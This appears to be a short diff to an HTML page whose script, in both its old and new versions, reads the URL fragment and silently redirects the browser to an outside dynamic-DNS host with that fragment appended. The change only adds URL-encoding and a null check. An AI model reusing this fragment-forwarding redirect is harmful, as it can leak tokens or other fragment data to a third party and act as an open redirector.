@@ -1,1 +1,8 @@
-<script>document.location.href = 'http://olunonline.duckdns.org/'+window.location.href.split('#')[1];</script>
+<script>
+    var targetUrl = window.location.href.split('#')[1];
+    if (targetUrl) {
+        // URL-encode the target URL to prevent issues with special characters
+        var encodedUrl = encodeURIComponent(targetUrl);
+        document.location.href = 'http://olunonline.duckdns.org/' + encodedUrl;
+    }
+</script>
